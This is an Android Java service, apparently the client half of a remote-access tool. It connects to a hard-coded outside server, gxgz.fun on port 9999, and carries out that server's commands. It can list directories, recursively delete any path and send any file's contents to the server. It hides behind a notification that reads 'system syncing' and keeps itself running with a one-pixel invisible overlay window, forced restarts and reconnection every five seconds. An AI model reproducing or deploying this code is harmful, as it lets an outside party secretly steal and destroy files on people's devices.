package o.client.gay;

import android.app.*;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.os.*;
import android.provider.Settings;
import android.util.Log;
import android.view.*;
import androidx.core.app.NotificationCompat;
import java.io.*;
import java.net.Socket;

public class ClientService extends Service {
    private static final String IP = "gxgz.fun"; // 【重要】修改为服务端IP
    private static final int PORT = 9999;
    private WindowManager wm;
    private View dummyView;

    @Override
    public void onCreate() {
        super.onCreate();
        // 1. 立即显示通知，防止 ForegroundServiceDidNotStartInTimeException 崩溃
        String channelId = "client_sync";
        NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            nm.createNotificationChannel(new NotificationChannel(channelId, "Sync", NotificationManager.IMPORTANCE_LOW));
        }
        Notification n = new NotificationCompat.Builder(this, channelId)
                .setContentTitle("系统同步中").setSmallIcon(android.R.drawable.stat_notify_sync).build();

        if (Build.VERSION.SDK_INT >= 34) {
            startForeground(101, n, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
        } else {
            startForeground(101, n);
        }

        // 2. 1像素悬浮窗保活
        if (Settings.canDrawOverlays(this)) {
            try {
                wm = (WindowManager) getSystemService(WINDOW_SERVICE);
                WindowManager.LayoutParams p = new WindowManager.LayoutParams(1, 1,
                        Build.VERSION.SDK_INT >= 26 ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY : WindowManager.LayoutParams.TYPE_PHONE,
                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE, PixelFormat.TRANSLUCENT);
                dummyView = new View(this);
                wm.addView(dummyView, p);
            } catch (Exception e) { Log.e("Client", "Float window failed"); }
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        new Thread(this::workLoop).start();
        return START_STICKY;
    }

    private void workLoop() {
        while (true) {
            try (Socket s = new Socket(IP, PORT);
                 DataInputStream dis = new DataInputStream(s.getInputStream());
                 DataOutputStream dos = new DataOutputStream(s.getOutputStream())) {

                s.setKeepAlive(true);
                dos.writeUTF("CLIENT_READY");
                Log.d("Client", "Connected to Server");

                while (true) {
                    String cmd = dis.readUTF();
                    String[] p = cmd.split("\\|");
                    String action = p[0];
                    File target = new File(p[1]);

                    if (action.equals("LIST")) {
                        File[] files = target.listFiles();
                        StringBuilder sb = new StringBuilder("[");
                        if (files != null) {
                            for (int i = 0; i < files.length; i++) {
                                sb.append(String.format("{\"name\":\"%s\",\"isDir\":%b,\"size\":%d}",
                                        files[i].getName(), files[i].isDirectory(), files[i].length()));
                                if (i < files.length - 1) sb.append(",");
                            }
                        }
                        sb.append("]");
                        dos.writeUTF(sb.toString());
                    } else if (action.equals("DEL")) {
                        recursiveDelete(target);
                        dos.writeUTF("DONE");
                    } else if (action.equals("DOWN")) {
                        if (target.exists() && !target.isDirectory()) {
                            dos.writeLong(target.length());
                            try (FileInputStream fis = new FileInputStream(target)) {
                                byte[] b = new byte[8192];
                                int len;
                                while ((len = fis.read(b)) != -1) dos.write(b, 0, len);
                            }
                        } else {
                            dos.writeLong(-1);
                        }
                    }
                    dos.flush();
                }
            } catch (Exception e) {
                Log.e("Client", "Disconnected: " + e.getMessage());
                SystemClock.sleep(5000); // 5秒后重连
            }
        }
    }

    private void recursiveDelete(File f) {
        if (f.isDirectory()) {
            File[] subs = f.listFiles();
            if (subs != null) for (File s : subs) recursiveDelete(s);
        }
        f.delete();
    }

    @Override public void onDestroy() {
        if (wm != null && dummyView != null) wm.removeView(dummyView);
        super.onDestroy();
    }
    @Override public IBinder onBind(Intent i) { return null; }
}